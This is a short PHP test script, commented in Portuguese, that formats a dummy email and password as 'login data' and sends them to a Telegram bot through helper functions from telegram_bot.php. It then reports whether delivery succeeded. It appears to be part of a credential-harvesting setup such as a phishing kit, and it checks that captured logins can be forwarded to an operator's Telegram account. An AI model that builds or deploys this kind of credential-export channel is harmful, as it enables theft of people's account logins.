<?php
// Arquivo de teste para verificar a integração com o Telegram

// Inclui as funções do bot do Telegram
require_once __DIR__ . '/telegram_bot.php';

// Testa o envio de uma mensagem
$email_teste = 'teste@exemplo.com';
$senha_teste = 'senha123';

// Formata a mensagem
$mensagem = formatarDadosLogin($email_teste, $senha_teste);

echo "Testando envio para Telegram...\n";
echo "Mensagem: " . $mensagem . "\n\n";

// Tenta enviar
$resultado = enviarParaTelegram($mensagem);

if ($resultado) {
    echo "✅ Sucesso! Mensagem enviada para o Telegram.\n";
} else {
    echo "❌ Erro! Não foi possível enviar a mensagem.\n";
}

echo "\nVerifique seu bot do Telegram para confirmar o recebimento.\n";
?>